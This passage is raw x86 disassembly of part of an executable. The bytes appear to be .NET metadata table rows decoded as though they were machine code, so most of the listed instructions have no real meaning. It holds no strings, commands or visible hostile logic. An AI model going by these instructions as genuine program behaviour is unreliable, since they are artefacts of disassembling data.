  407bcf:	00 e1                	add    %ah,%cl
  407bd1:	01 90 09 9e 00 44    	add    %edx,0x44009e09(%eax)
  407bd7:	00 50 46             	add    %dl,0x46(%eax)
  407bda:	00 00                	add    %al,(%eax)
  407bdc:	00 00                	add    %al,(%eax)
  407bde:	e1 01                	loope  0x407be1
  407be0:	56                   	push   %esi
  407be1:	19 52 00             	sbb    %edx,0x0(%edx)
  407be4:	45                   	inc    %ebp
  407be5:	00 04 22             	add    %al,(%edx,%eiz,1)
  407be8:	00 00                	add    %al,(%eax)
  407bea:	00 00                	add    %al,(%eax)
  407bec:	e1 01                	loope  0x407bef
  407bee:	90                   	nop
  407bef:	09 9e 00 45 00 24    	or     %ebx,0x24004500(%esi)
  407bf5:	48                   	dec    %eax
  407bf6:	00 00                	add    %al,(%eax)
  407bf8:	00 00                	add    %al,(%eax)
  407bfa:	e1 01                	loope  0x407bfd
  407bfc:	56                   	push   %esi
  407bfd:	19 52 00             	sbb    %edx,0x0(%edx)
  407c00:	46                   	inc    %esi
  407c01:	00 12                	add    %dl,(%edx)
  407c03:	22 00                	and    (%eax),%al
  407c05:	00 00                	add    %al,(%eax)
  407c07:	00 e1                	add    %ah,%cl
  407c09:	01 90 09 9e 00 46    	add    %edx,0x46009e09(%eax)
  407c0f:	00 f4                	add    %dh,%ah
  407c11:	48                   	dec    %eax
  407c12:	00 00                	add    %al,(%eax)
  407c14:	00 00                	add    %al,(%eax)
  407c16:	e1 01                	loope  0x407c19
  407c18:	56                   	push   %esi
  407c19:	19 52 00             	sbb    %edx,0x0(%edx)
  407c1c:	47                   	inc    %edi
  407c1d:	00 20                	add    %ah,(%eax)
  407c1f:	22 00                	and    (%eax),%al
  407c21:	00 00                	add    %al,(%eax)
  407c23:	00 e1                	add    %ah,%cl
  407c25:	01 90 09 9e 00 47    	add    %edx,0x47009e09(%eax)
  407c2b:	00 2e                	add    %ch,(%esi)
  407c2d:	22 00                	and    (%eax),%al
  407c2f:	00 00                	add    %al,(%eax)
  407c31:	00 86 18 7b 14 52    	add    %al,0x52147b18(%esi)
  407c37:	00 48 00             	add    %cl,0x0(%eax)
  407c3a:	3d 22 00 00 00       	cmp    $0x22,%eax
  407c3f:	00 86 18 7b 14 79    	add    %al,0x79147b18(%esi)
  407c45:	01 48 00             	add    %ecx,0x0(%eax)
  407c48:	c4 49 00             	les    0x0(%ecx),%ecx
  407c4b:	00 00                	add    %al,(%eax)
  407c4d:	00 81 00 d6 12 81    	add    %al,-0x7eed2a00(%ecx)
  407c53:	01 4a 00             	add    %ecx,0x0(%edx)
  407c56:	10 4a 00             	adc    %cl,0x0(%edx)
  407c59:	00 00                	add    %al,(%eax)
  407c5b:	00 81 00 be 12 81    	add    %al,-0x7eed4200(%ecx)
  407c61:	01 4b 00             	add    %ecx,0x0(%ebx)
  407c64:	5c                   	pop    %esp
  407c65:	4a                   	dec    %edx
  407c66:	00 00                	add    %al,(%eax)
  407c68:	00 00                	add    %al,(%eax)
  407c6a:	96                   	xchg   %eax,%esi
  407c6b:	00 c2                	add    %al,%dl
  407c6d:	16                   	push   %ss
  407c6e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407c6f:	00 4c 00 b0          	add    %cl,-0x50(%eax,%eax,1)
  407c73:	4a                   	dec    %edx
  407c74:	00 00                	add    %al,(%eax)
  407c76:	00 00                	add    %al,(%eax)
  407c78:	81 00 2a 12 8b 01    	addl   $0x18b122a,(%eax)
  407c7e:	4e                   	dec    %esi
  407c7f:	00 f0                	add    %dh,%al
  407c81:	4a                   	dec    %edx
  407c82:	00 00                	add    %al,(%eax)
  407c84:	00 00                	add    %al,(%eax)
  407c86:	86 00                	xchg   %al,(%eax)
  407c88:	1b 0a                	sbb    (%edx),%ecx
  407c8a:	92                   	xchg   %eax,%edx
  407c8b:	01 4f 00             	add    %ecx,0x0(%edi)
  407c8e:	18 4b 00             	sbb    %cl,0x0(%ebx)
  407c91:	00 00                	add    %al,(%eax)
  407c93:	00 86 00 94 06 36    	add    %al,0x36069400(%esi)
  407c99:	01 51 00             	add    %edx,0x0(%ecx)
  407c9c:	64 4b                	fs dec %ebx
  407c9e:	00 00                	add    %al,(%eax)
  407ca0:	00 00                	add    %al,(%eax)
  407ca2:	86 00                	xchg   %al,(%eax)
  407ca4:	c1 06 2d             	roll   $0x2d,(%esi)
  407ca7:	01 52 00             	add    %edx,0x0(%edx)
  407caa:	a8 4b                	test   $0x4b,%al
  407cac:	00 00                	add    %al,(%eax)
  407cae:	00 00                	add    %al,(%eax)
  407cb0:	86 00                	xchg   %al,(%eax)
  407cb2:	ad                   	lods   %ds:(%esi),%eax
  407cb3:	17                   	pop    %ss
  407cb4:	9a 01 52 00 f8 4b 00 	lcall  $0x4b,$0xf8005201
  407cbb:	00 00                	add    %al,(%eax)
  407cbd:	00 86 00 67 15 a1    	add    %al,-0x5eea9900(%esi)
  407cc3:	01 54 00 5f          	add    %edx,0x5f(%eax,%eax,1)
  407cc7:	22 00                	and    (%eax),%al
  407cc9:	00 00                	add    %al,(%eax)
  407ccb:	00 86 00 d6 18 48    	add    %al,0x4818d600(%esi)
  407cd1:	01 55 00             	add    %edx,0x0(%ebp)
  407cd4:	74 22                	je     0x407cf8
  407cd6:	00 00                	add    %al,(%eax)
  407cd8:	00 00                	add    %al,(%eax)
  407cda:	86 00                	xchg   %al,(%eax)
  407cdc:	e5 18                	in     $0x18,%eax
  407cde:	52                   	push   %edx
  407cdf:	00 56 00             	add    %dl,0x0(%esi)
  407ce2:	89 22                	mov    %esp,(%edx)
  407ce4:	00 00                	add    %al,(%eax)
  407ce6:	00 00                	add    %al,(%eax)
  407ce8:	91                   	xchg   %eax,%ecx
  407ce9:	18 81 14 b8 01 56    	sbb    %al,0x5601b814(%ecx)
  407cef:	00 78 20             	add    %bh,0x20(%eax)
  407cf2:	00 00                	add    %al,(%eax)
  407cf4:	00 00                	add    %al,(%eax)
  407cf6:	86 18                	xchg   %bl,(%eax)
  407cf8:	7b 14                	jnp    0x407d0e
  407cfa:	52                   	push   %edx
  407cfb:	00 56 00             	add    %dl,0x0(%esi)
  407cfe:	95                   	xchg   %eax,%ebp
  407cff:	22 00                	and    (%eax),%al
  407d01:	00 00                	add    %al,(%eax)
  407d03:	00 83 00 93 00 bc    	add    %al,-0x43ff6d00(%ebx)
  407d09:	01 56 00             	add    %edx,0x0(%esi)
  407d0c:	50                   	push   %eax
  407d0d:	4c                   	dec    %esp
  407d0e:	00 00                	add    %al,(%eax)
  407d10:	00 00                	add    %al,(%eax)
  407d12:	e1 01                	loope  0x407d15
  407d14:	56                   	push   %esi
  407d15:	19 52 00             	sbb    %edx,0x0(%edx)
  407d18:	57                   	push   %edi
  407d19:	00 98 22 00 00 00    	add    %bl,0x22(%eax)
  407d1f:	00 e1                	add    %ah,%cl
  407d21:	01 90 09 9e 00 57    	add    %edx,0x57009e09(%eax)
  407d27:	00 8c 4e 00 00 00 00 	add    %cl,0x0(%esi,%ecx,2)
  407d2e:	e1 01                	loope  0x407d31
  407d30:	56                   	push   %esi
  407d31:	19 52 00             	sbb    %edx,0x0(%edx)
  407d34:	58                   	pop    %eax
  407d35:	00 a6 22 00 00 00    	add    %ah,0x22(%esi)
  407d3b:	00 e1                	add    %ah,%cl
  407d3d:	01 90 09 9e 00 58    	add    %edx,0x58009e09(%eax)
  407d43:	00 78 51             	add    %bh,0x51(%eax)
  407d46:	00 00                	add    %al,(%eax)
  407d48:	00 00                	add    %al,(%eax)
  407d4a:	e1 01                	loope  0x407d4d
  407d4c:	56                   	push   %esi
  407d4d:	19 52 00             	sbb    %edx,0x0(%edx)
  407d50:	59                   	pop    %ecx
  407d51:	00 b4 22 00 00 00 00 	add    %dh,0x0(%edx,%eiz,1)
  407d58:	e1 01                	loope  0x407d5b
  407d5a:	90                   	nop
  407d5b:	09 9e 00 59 00 f8    	or     %ebx,-0x7ffa700(%esi)
  407d61:	52                   	push   %edx
  407d62:	00 00                	add    %al,(%eax)
  407d64:	00 00                	add    %al,(%eax)
  407d66:	e1 01                	loope  0x407d69
  407d68:	56                   	push   %esi
  407d69:	19 52 00             	sbb    %edx,0x0(%edx)
  407d6c:	5a                   	pop    %edx
  407d6d:	00 c2                	add    %al,%dl
  407d6f:	22 00                	and    (%eax),%al
  407d71:	00 00                	add    %al,(%eax)
  407d73:	00 e1                	add    %ah,%cl
  407d75:	01 90 09 9e 00 5a    	add    %edx,0x5a009e09(%eax)
  407d7b:	00 c4                	add    %al,%ah
  407d7d:	54                   	push   %esp
  407d7e:	00 00                	add    %al,(%eax)
  407d80:	00 00                	add    %al,(%eax)
  407d82:	91                   	xchg   %eax,%ecx
  407d83:	00 10                	add    %dl,(%eax)
  407d85:	10 d5                	adc    %dl,%ch
  407d87:	01 5b 00             	add    %ebx,0x0(%ebx)
  407d8a:	d0 22                	shlb   $1,(%edx)
  407d8c:	00 00                	add    %al,(%eax)
  407d8e:	00 00                	add    %al,(%eax)
  407d90:	96                   	xchg   %eax,%esi
  407d91:	00 2c 17             	add    %ch,(%edi,%edx,1)
  407d94:	dc 01                	faddl  (%ecx)
  407d96:	5c                   	pop    %esp
  407d97:	00 88 56 00 00 00    	add    %cl,0x56(%eax)
  407d9d:	00 91 00 14 11 e2    	add    %dl,-0x1deeec00(%ecx)
  407da3:	01 5d 00             	add    %ebx,0x0(%ebp)
  407da6:	78 20                	js     0x407dc8
  407da8:	00 00                	add    %al,(%eax)
  407daa:	00 00                	add    %al,(%eax)
  407dac:	86 18                	xchg   %bl,(%eax)
  407dae:	7b 14                	jnp    0x407dc4
  407db0:	52                   	push   %edx
  407db1:	00 5f 00             	add    %bl,0x0(%edi)
  407db4:	68 57 00 00 00       	push   $0x57
  407db9:	00 91 18 81 14 b8    	add    %dl,-0x47eb7ee8(%ecx)
  407dbf:	01 5f 00             	add    %ebx,0x0(%edi)
  407dc2:	e8 57 00 00 00       	call   0x407e1e
  407dc7:	00 91 08 b0 05 e9    	add    %dl,-0x16fa4ff8(%ecx)
  407dcd:	01 5f 00             	add    %ebx,0x0(%edi)
  407dd0:	08 58 00             	or     %bl,0x0(%eax)
  407dd3:	00 00                	add    %al,(%eax)
  407dd5:	00 e1                	add    %ah,%cl
  407dd7:	01 56 19             	add    %edx,0x19(%esi)
  407dda:	52                   	push   %edx
  407ddb:	00 60 00             	add    %ah,0x0(%eax)
  407dde:	dd 22                	frstor (%edx)
  407de0:	00 00                	add    %al,(%eax)
  407de2:	00 00                	add    %al,(%eax)
  407de4:	e1 01                	loope  0x407de7
  407de6:	90                   	nop
  407de7:	09 9e 00 60 00 eb    	or     %ebx,-0x14ffa000(%esi)
  407ded:	22 00                	and    (%eax),%al
  407def:	00 00                	add    %al,(%eax)
  407df1:	00 86 18 7b 14 f3    	add    %al,-0xceb84e8(%esi)
  407df7:	01 61 00             	add    %esp,0x0(%ecx)
  407dfa:	fa                   	cli
  407dfb:	22 00                	and    (%eax),%al
  407dfd:	00 00                	add    %al,(%eax)
  407dff:	00 c6                	add    %al,%dh
  407e01:	08 a5 0d f9 01 62    	or     %ah,0x6201f90d(%ebp)
  407e07:	00 07                	add    %al,(%edi)
  407e09:	23 00                	and    (%eax),%eax
  407e0b:	00 00                	add    %al,(%eax)
  407e0d:	00 c6                	add    %al,%dh
  407e0f:	00 3e                	add    %bh,(%esi)
  407e11:	0a fe                	or     %dh,%bh
  407e13:	01 62 00             	add    %esp,0x0(%edx)
  407e16:	21 23                	and    %esp,(%ebx)
  407e18:	00 00                	add    %al,(%eax)
  407e1a:	00 00                	add    %al,(%eax)
  407e1c:	c6 00 67             	movb   $0x67,(%eax)
  407e1f:	09 03                	or     %eax,(%ebx)
  407e21:	02 63 00             	add    0x0(%ebx),%ah
  407e24:	3b 23                	cmp    (%ebx),%esp
  407e26:	00 00                	add    %al,(%eax)
  407e28:	00 00                	add    %al,(%eax)
  407e2a:	86 00                	xchg   %al,(%eax)
  407e2c:	16                   	push   %ss
  407e2d:	19 08                	sbb    %ecx,(%eax)
  407e2f:	02 64 00 47          	add    0x47(%eax,%eax,1),%ah
  407e33:	23 00                	and    (%eax),%eax
  407e35:	00 00                	add    %al,(%eax)
  407e37:	00 86 00 02 19 52    	add    %al,0x52190200(%esi)
  407e3d:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  407e41:	00 00                	add    %al,(%eax)
  407e43:	00 80 00 91 20 31    	add    %al,0x31209100(%eax)
  407e49:	10 11                	adc    %dl,(%ecx)
  407e4b:	02 64 00 00          	add    0x0(%eax,%eax,1),%ah
  407e4f:	00 00                	add    %al,(%eax)
  407e51:	00 80 00 91 20 aa    	add    %al,-0x55df6f00(%eax)
  407e57:	19 17                	sbb    %edx,(%edi)
  407e59:	02 65 00             	add    0x0(%ebp),%ah
  407e5c:	00 00                	add    %al,(%eax)
  407e5e:	00 00                	add    %al,(%eax)
  407e60:	80 00 91             	addb   $0x91,(%eax)
  407e63:	20 78 19             	and    %bh,0x19(%eax)
  407e66:	1b 02                	sbb    (%edx),%eax
  407e68:	65 00 00             	add    %al,%gs:(%eax)
  407e6b:	00 00                	add    %al,(%eax)
  407e6d:	00 80 00 91 20 90    	add    %al,-0x6fdf6f00(%eax)
  407e73:	0e                   	push   %cs
  407e74:	23 02                	and    (%edx),%eax
  407e76:	68 00 00 00 00       	push   $0x0
  407e7b:	00 80 00 91 20 37    	add    %al,0x37209100(%eax)
  407e81:	07                   	pop    %es
  407e82:	28 02                	sub    %al,(%edx)
  407e84:	69 00 00 00 00 00    	imul   $0x0,(%eax),%eax
  407e8a:	80 00 91             	addb   $0x91,(%eax)
  407e8d:	20 c1                	and    %al,%cl
  407e8f:	11 2f                	adc    %ebp,(%edi)
  407e91:	02 6b 00             	add    0x0(%ebx),%ch
  407e94:	00 00                	add    %al,(%eax)
  407e96:	00 00                	add    %al,(%eax)
  407e98:	80 00 91             	addb   $0x91,(%eax)
  407e9b:	20 8b 08 37 02 6c    	and    %cl,0x6c023708(%ebx)
  407ea1:	00 38                	add    %bh,(%eax)
  407ea3:	5d                   	pop    %ebp
  407ea4:	00 00                	add    %al,(%eax)
  407ea6:	00 00                	add    %al,(%eax)
  407ea8:	96                   	xchg   %eax,%esi
  407ea9:	00 0e                	add    %cl,(%esi)
  407eab:	07                   	pop    %es
  407eac:	3c 02                	cmp    $0x2,%al
  407eae:	6d                   	insl   (%dx),%es:(%edi)
  407eaf:	00 74 5d 00          	add    %dh,0x0(%ebp,%ebx,2)
  407eb3:	00 00                	add    %al,(%eax)
  407eb5:	00 96 00 be 19 44    	add    %dl,0x4419be00(%esi)
  407ebb:	02 6d 00             	add    0x0(%ebp),%ch
  407ebe:	0c 5e                	or     $0x5e,%al
  407ec0:	00 00                	add    %al,(%eax)
  407ec2:	00 00                	add    %al,(%eax)
  407ec4:	96                   	xchg   %eax,%esi
  407ec5:	00 66 10             	add    %ah,0x10(%esi)
  407ec8:	11 02                	adc    %eax,(%edx)
  407eca:	6d                   	insl   (%dx),%es:(%edi)
  407ecb:	00 38                	add    %bh,(%eax)
  407ecd:	5e                   	pop    %esi
  407ece:	00 00                	add    %al,(%eax)
  407ed0:	00 00                	add    %al,(%eax)
  407ed2:	96                   	xchg   %eax,%esi
  407ed3:	00 ac 16 44 02 6d 00 	add    %ch,0x6d0244(%esi,%edx,1)
  407eda:	34 5f                	xor    $0x5f,%al
  407edc:	00 00                	add    %al,(%eax)
  407ede:	00 00                	add    %al,(%eax)
  407ee0:	96                   	xchg   %eax,%esi
  407ee1:	00 81 10 44 02 6d    	add    %al,0x6d024410(%ecx)
  407ee7:	00 e4                	add    %ah,%ah
  407ee9:	5f                   	pop    %edi
  407eea:	00 00                	add    %al,(%eax)
  407eec:	00 00                	add    %al,(%eax)
  407eee:	96                   	xchg   %eax,%esi
  407eef:	00 17                	add    %dl,(%edi)
  407ef1:	06                   	push   %es
  407ef2:	44                   	inc    %esp
  407ef3:	02 6d 00             	add    0x0(%ebp),%ch
  407ef6:	60                   	pusha
  407ef7:	60                   	pusha
  407ef8:	00 00                	add    %al,(%eax)
  407efa:	00 00                	add    %al,(%eax)
  407efc:	96                   	xchg   %eax,%esi
  407efd:	00 37                	add    %dh,(%edi)
  407eff:	0e                   	push   %cs
  407f00:	48                   	dec    %eax
  407f01:	02 6d 00             	add    0x0(%ebp),%ch
  407f04:	c8 60 00 00          	enter  $0x60,$0x0
  407f08:	00 00                	add    %al,(%eax)
  407f0a:	96                   	xchg   %eax,%esi
  407f0b:	00 ec                	add    %ch,%ah
  407f0d:	06                   	push   %es
  407f0e:	4d                   	dec    %ebp
  407f0f:	02 6e 00             	add    0x0(%esi),%ch
  407f12:	2c 61                	sub    $0x61,%al
  407f14:	00 00                	add    %al,(%eax)
  407f16:	00 00                	add    %al,(%eax)
  407f18:	96                   	xchg   %eax,%esi
  407f19:	00 fb                	add    %bh,%bl
  407f1b:	11 62 02             	adc    %esp,0x2(%edx)
  407f1e:	73 00                	jae    0x407f20
  407f20:	70 61                	jo     0x407f83
  407f22:	00 00                	add    %al,(%eax)
  407f24:	00 00                	add    %al,(%eax)
  407f26:	96                   	xchg   %eax,%esi
  407f27:	00 1c 0f             	add    %bl,(%edi,%ecx,1)
  407f2a:	68 02 74 00 ac       	push   $0xac007402
  407f2f:	61                   	popa
  407f30:	00 00                	add    %al,(%eax)
  407f32:	00 00                	add    %al,(%eax)
  407f34:	96                   	xchg   %eax,%esi
  407f35:	00 3f                	add    %bh,(%edi)
  407f37:	10 6d 02             	adc    %ch,0x2(%ebp)
  407f3a:	74 00                	je     0x407f3c
  407f3c:	f8                   	clc
  407f3d:	61                   	popa
  407f3e:	00 00                	add    %al,(%eax)
  407f40:	00 00                	add    %al,(%eax)
  407f42:	96                   	xchg   %eax,%esi
  407f43:	00 54 10 6d          	add    %dl,0x6d(%eax,%edx,1)
  407f47:	02 76 00             	add    0x0(%esi),%dh
  407f4a:	44                   	inc    %esp
  407f4b:	62 00                	bound  %eax,(%eax)
  407f4d:	00 00                	add    %al,(%eax)
  407f4f:	00 96 00 9e 06 9a    	add    %dl,-0x65f96200(%esi)
  407f55:	02 78 00             	add    0x0(%eax),%bh
  407f58:	80 62 00 00          	andb   $0x0,0x0(%edx)
  407f5c:	00 00                	add    %al,(%eax)
  407f5e:	96                   	xchg   %eax,%esi
  407f5f:	00 40 09             	add    %al,0x9(%eax)
  407f62:	a2 02 78 00 78       	mov    %al,0x78007802
  407f67:	20 00                	and    %al,(%eax)
  407f69:	00 00                	add    %al,(%eax)
  407f6b:	00 86 18 7b 14 52    	add    %al,0x52147b18(%esi)
  407f71:	00 78 00             	add    %bh,0x0(%eax)
  407f74:	54                   	push   %esp
  407f75:	23 00                	and    (%eax),%eax
  407f77:	00 00                	add    %al,(%eax)
  407f79:	00 91 18 81 14 b8    	add    %dl,-0x47eb7ee8(%ecx)
  407f7f:	01 78 00             	add    %edi,0x0(%eax)
  407f82:	78 20                	js     0x407fa4
  407f84:	00 00                	add    %al,(%eax)
  407f86:	00 00                	add    %al,(%eax)
  407f88:	86 18                	xchg   %bl,(%eax)
  407f8a:	7b 14                	jnp    0x407fa0
  407f8c:	52                   	push   %edx
  407f8d:	00 78 00             	add    %bh,0x0(%eax)
  407f90:	60                   	pusha
  407f91:	23 00                	and    (%eax),%eax
  407f93:	00 00                	add    %al,(%eax)
  407f95:	00 83 00 c1 00 08    	add    %al,0x800c100(%ebx)
  407f9b:	02 78 00             	add    0x0(%eax),%bh
  407f9e:	67 23 00             	and    (%bx,%si),%eax
  407fa1:	00 00                	add    %al,(%eax)
  407fa3:	00 83 00 5a 00 bc    	add    %al,-0x43ffa600(%ebx)
  407fa9:	02 78 00             	add    0x0(%eax),%bh
  407fac:	78 20                	js     0x407fce
  407fae:	00 00                	add    %al,(%eax)
  407fb0:	00 00                	add    %al,(%eax)
  407fb2:	86 18                	xchg   %bl,(%eax)
  407fb4:	7b 14                	jnp    0x407fca
  407fb6:	52                   	push   %edx
  407fb7:	00 78 00             	add    %bh,0x0(%eax)
  407fba:	b8 62 00 00 00       	mov    $0x62,%eax
  407fbf:	00 83 00 02 01 52    	add    %al,0x52010200(%ebx)
  407fc5:	00 78 00             	add    %bh,0x0(%eax)
  407fc8:	78 20                	js     0x407fea
  407fca:	00 00                	add    %al,(%eax)
  407fcc:	00 00                	add    %al,(%eax)
  407fce:	86 18                	xchg   %bl,(%eax)
  407fd0:	7b 14                	jnp    0x407fe6
  407fd2:	52                   	push   %edx
  407fd3:	00 78 00             	add    %bh,0x0(%eax)
  407fd6:	c0 65 00 00          	shlb   $0x0,0x0(%ebp)
  407fda:	00 00                	add    %al,(%eax)
  407fdc:	83 00 e7             	addl   $0xffffffe7,(%eax)
  407fdf:	00 29                	add    %ch,(%ecx)
  407fe1:	01 78 00             	add    %edi,0x0(%eax)
  407fe4:	40                   	inc    %eax
  407fe5:	66 00 00             	data16 add %al,(%eax)
  407fe8:	00 00                	add    %al,(%eax)
  407fea:	e1 01                	loope  0x407fed
  407fec:	56                   	push   %esi
  407fed:	19 52 00             	sbb    %edx,0x0(%edx)
  407ff0:	78 00                	js     0x407ff2
  407ff2:	6e                   	outsb  %ds:(%esi),(%dx)
  407ff3:	23 00                	and    (%eax),%eax
  407ff5:	00 00                	add    %al,(%eax)
  407ff7:	00 e1                	add    %ah,%cl
  407ff9:	01 90 09 9e 00 78    	add    %edx,0x78009e09(%eax)
  407fff:	00 30                	add    %dh,(%eax)
  408001:	68 00 00 00 00       	push   $0x0
  408006:	e1 01                	loope  0x408009
  408008:	56                   	push   %esi
  408009:	19 52 00             	sbb    %edx,0x0(%edx)
  40800c:	79 00                	jns    0x40800e
  40800e:	7c 23                	jl     0x408033
  408010:	00 00                	add    %al,(%eax)
  408012:	00 00                	add    %al,(%eax)
  408014:	e1 01                	loope  0x408017
  408016:	90                   	nop
  408017:	09 9e 00 79 00 04    	or     %ebx,0x4007900(%esi)
  40801d:	69 00 00 00 00 e1    	imul   $0xe1000000,(%eax),%eax
  408023:	01 56 19             	add    %edx,0x19(%esi)
  408026:	52                   	push   %edx
  408027:	00 7a 00             	add    %bh,0x0(%edx)
  40802a:	8a 23                	mov    (%ebx),%ah
  40802c:	00 00                	add    %al,(%eax)
  40802e:	00 00                	add    %al,(%eax)
  408030:	e1 01                	loope  0x408033
  408032:	90                   	nop
  408033:	09 9e 00 7a 00 14    	or     %ebx,0x14007a00(%esi)
  408039:	6a 00                	push   $0x0
  40803b:	00 00                	add    %al,(%eax)
  40803d:	00 e1                	add    %ah,%cl
  40803f:	01 56 19             	add    %edx,0x19(%esi)
  408042:	52                   	push   %edx
  408043:	00 7b 00             	add    %bh,0x0(%ebx)
  408046:	98                   	cwtl
  408047:	23 00                	and    (%eax),%eax
  408049:	00 00                	add    %al,(%eax)
  40804b:	00 e1                	add    %ah,%cl
  40804d:	01 90 09 9e 00 7b    	add    %edx,0x7b009e09(%eax)
  408053:	00 e0                	add    %ah,%al
  408055:	6a 00                	push   $0x0
  408057:	00 00                	add    %al,(%eax)
  408059:	00 e1                	add    %ah,%cl
  40805b:	01 56 19             	add    %edx,0x19(%esi)
  40805e:	52                   	push   %edx
  40805f:	00 7c 00 a6          	add    %bh,-0x5a(%eax,%eax,1)
  408063:	23 00                	and    (%eax),%eax
  408065:	00 00                	add    %al,(%eax)
  408067:	00 e1                	add    %ah,%cl
  408069:	01 90 09 9e 00 7c    	add    %edx,0x7c009e09(%eax)
  40806f:	00 ac 6b 00 00 00 00 	add    %ch,0x0(%ebx,%ebp,2)
  408076:	e1 01                	loope  0x408079
  408078:	56                   	push   %esi
  408079:	19 52 00             	sbb    %edx,0x0(%edx)
  40807c:	7d 00                	jge    0x40807e
  40807e:	b4 23                	mov    $0x23,%ah
  408080:	00 00                	add    %al,(%eax)
  408082:	00 00                	add    %al,(%eax)
  408084:	e1 01                	loope  0x408087
  408086:	90                   	nop
  408087:	09 9e 00 7d 00 74    	or     %ebx,0x74007d00(%esi)
  40808d:	6c                   	insb   (%dx),%es:(%edi)
  40808e:	00 00                	add    %al,(%eax)
  408090:	00 00                	add    %al,(%eax)
  408092:	e1 01                	loope  0x408095
  408094:	56                   	push   %esi
  408095:	19 52 00             	sbb    %edx,0x0(%edx)
  408098:	7e 00                	jle    0x40809a
  40809a:	c2 23 00             	ret    $0x23
  40809d:	00 00                	add    %al,(%eax)
  40809f:	00 e1                	add    %ah,%cl
  4080a1:	01 90 09 9e 00 7e    	add    %edx,0x7e009e09(%eax)
  4080a7:	00 00                	add    %al,(%eax)
  4080a9:	00 01                	add    %al,(%ecx)
  4080ab:	00 c9                	add    %cl,%cl
  4080ad:	16                   	push   %ss
  4080ae:	02 00                	add    (%eax),%al
  4080b0:	02 00                	add    (%eax),%al
  4080b2:	32 0d 02 00 03 00    	xor    0x30002,%cl
  4080b8:	67 11 00             	adc    %eax,(%bx,%si)
  4080bb:	00 01                	add    %al,(%ecx)
  4080bd:	00 c9                	add    %cl,%cl
  4080bf:	16                   	push   %ss
  4080c0:	00 00                	add    %al,(%eax)
  4080c2:	02 00                	add    (%eax),%al
  4080c4:	01 13                	add    %edx,(%ebx)
  4080c6:	00 00                	add    %al,(%eax)
  4080c8:	03 00                	add    (%eax),%eax
  4080ca:	59                   	pop    %ecx
  4080cb:	0d 00 00 04 00       	or     $0x40000,%eax
  4080d0:	f0 12 00             	lock adc (%eax),%al
  4080d3:	00 05 00 44 0d 02    	add    %al,0x20d4400
  4080d9:	00 06                	add    %al,(%esi)
  4080db:	00 cd                	add    %cl,%ch
  4080dd:	0c 00                	or     $0x0,%al
  4080df:	00 01                	add    %al,(%ecx)
  4080e1:	00 c9                	add    %cl,%cl
  4080e3:	16                   	push   %ss
  4080e4:	00 00                	add    %al,(%eax)
  4080e6:	02 00                	add    (%eax),%al
  4080e8:	24 13                	and    $0x13,%al
  4080ea:	00 00                	add    %al,(%eax)
  4080ec:	03 00                	add    (%eax),%eax
  4080ee:	65 0e                	gs push %cs
  4080f0:	00 00                	add    %al,(%eax)
  4080f2:	04 00                	add    $0x0,%al
  4080f4:	31 13                	xor    %edx,(%ebx)
  4080f6:	00 00                	add    %al,(%eax)
  4080f8:	05 00 78 0e 00       	add    $0xe7800,%eax
  4080fd:	00 06                	add    %al,(%esi)
  4080ff:	00 67 11             	add    %ah,0x11(%edi)
  408102:	02 00                	add    (%eax),%al
  408104:	07                   	pop    %es
  408105:	00 21                	add    %ah,(%ecx)
  408107:	0d 00 00 08 00       	or     $0x80000,%eax
  40810c:	14 13                	adc    $0x13,%al
  40810e:	00 00                	add    %al,(%eax)
  408110:	01 00                	add    %eax,(%eax)
  408112:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  408113:	15 00 00 02 00       	adc    $0x20000,%eax
  408118:	7b 15                	jnp    0x40812f
  40811a:	00 00                	add    %al,(%eax)
  40811c:	01 00                	add    %eax,(%eax)
  40811e:	91                   	xchg   %eax,%ecx
  40811f:	0f 00 00             	sldt   (%eax)
  408122:	01 00                	add    %eax,(%eax)
  408124:	69 13 00 00 01 00    	imul   $0x10000,(%ebx),%edx
  40812a:	69 13 00 00 02 00    	imul   $0x20000,(%ebx),%edx
  408130:	70 0d                	jo     0x40813f
  408132:	00 00                	add    %al,(%eax)
  408134:	01 00                	add    %eax,(%eax)
  408136:	3e 14 00             	ds adc $0x0,%al
  408139:	00 01                	add    %al,(%ecx)
  40813b:	00 b7 12 00 00 02    	add    %dh,0x2000012(%edi)
  408141:	00 db                	add    %bl,%bl
  408143:	15 00 00 01 00       	adc    $0x10000,%eax
  408148:	a0 09 00 00 01       	mov    0x1000009,%al
  40814d:	00 67 06             	add    %ah,0x6(%edi)
  408150:	00 00                	add    %al,(%eax)
  408152:	02 00                	add    (%eax),%al
  408154:	64 1a 00             	sbb    %fs:(%eax),%al
  408157:	00 01                	add    %al,(%ecx)
  408159:	00 67 06             	add    %ah,0x6(%edi)
  40815c:	00 00                	add    %al,(%eax)
  40815e:	02 00                	add    (%eax),%al
  408160:	64 1a 00             	sbb    %fs:(%eax),%al
  408163:	00 01                	add    %al,(%ecx)
  408165:	00 0f                	add    %cl,(%edi)
  408167:	10 00                	adc    %al,(%eax)
  408169:	00 02                	add    %al,(%edx)
  40816b:	00 e4                	add    %ah,%ah
  40816d:	13 00                	adc    (%eax),%eax
  40816f:	00 01                	add    %al,(%ecx)
  408171:	00 67 06             	add    %ah,0x6(%edi)
  408174:	00 00                	add    %al,(%eax)
  408176:	01 00                	add    %eax,(%eax)
  408178:	18 08                	sbb    %cl,(%eax)
  40817a:	00 00                	add    %al,(%eax)
  40817c:	01 00                	add    %eax,(%eax)
  40817e:	16                   	push   %ss
  40817f:	01 00                	add    %eax,(%eax)
  408181:	00 01                	add    %al,(%ecx)
  408183:	00 3e                	add    %bh,(%esi)
  408185:	14 00                	adc    $0x0,%al
  408187:	00 01                	add    %al,(%ecx)
  408189:	00 3e                	add    %bh,(%esi)
  40818b:	14 00                	adc    $0x0,%al
  40818d:	00 02                	add    %al,(%edx)
  40818f:	00 67 06             	add    %ah,0x6(%edi)
  408192:	00 00                	add    %al,(%eax)
  408194:	01 00                	add    %eax,(%eax)
  408196:	3e 14 00             	ds adc $0x0,%al
  408199:	00 01                	add    %al,(%ecx)
  40819b:	00 3e                	add    %bh,(%esi)
  40819d:	14 00                	adc    $0x0,%al
  40819f:	00 02                	add    %al,(%edx)
  4081a1:	00 67 06             	add    %ah,0x6(%edi)
  4081a4:	00 00                	add    %al,(%eax)
  4081a6:	01 00                	add    %eax,(%eax)
  4081a8:	31 08                	xor    %ecx,(%eax)
  4081aa:	00 00                	add    %al,(%eax)
  4081ac:	01 00                	add    %eax,(%eax)
  4081ae:	a0 09 00 00 01       	mov    0x1000009,%al
